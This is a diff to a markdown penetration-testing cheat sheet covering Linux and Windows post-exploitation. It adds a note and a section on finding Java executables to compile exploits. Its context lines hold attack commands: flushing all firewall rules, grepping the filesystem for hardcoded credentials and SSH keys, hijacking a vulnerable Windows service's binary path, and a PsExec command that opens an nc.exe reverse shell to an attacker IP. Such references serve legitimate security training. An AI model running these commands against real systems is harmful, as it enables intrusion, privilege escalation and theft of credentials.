@@ -723,7 +723,6 @@ $ /sbin/iptables -L        # list firewall rules
 $ /sbin/iptables --flush   # delete all firewall rules
 ```
 
-
 Hardcoded credentials, backup ssh keys, interesting files
 ```
 # Recursive grep, match regex pattern, ignoring case for all files from the root directory.
@@ -901,7 +900,7 @@ sc config <vuln-service> binPath= "c:\inetpub\wwwroot\runmsf.exe" depend= "" sta
 net start <vulnerable-service>
 ```
 
-Psexec.exe:
+Psexec.exe (if you have creds):
 ```vb
 $ PsExec -u tom -p iamtom \\TOMSCOMP C:\path\to\nc.exe IP_OF_ATTACKING_SYSTEM 8080 -e C:\windows\system32\cmd.exe
 ```
@@ -910,6 +909,13 @@ $ PsExec -u tom -p iamtom \\TOMSCOMP C:\path\to\nc.exe IP_OF_ATTACKING_SYSTEM 80
 
 Net Use:
 * https://www.robvanderwoude.com/ntadmincommands.php#Cmd15
+
+
+Java bullshit:
+```powershell
+C:\> dir /S java.exe   # find path of java runtime exe - if multiple results, test exploit on different java.exe's
+C:\> dir /S javac.exe  # find path of java compiler exe (to compile exploits)
+```
 
 Windows file transfer methods:
 ```powershell
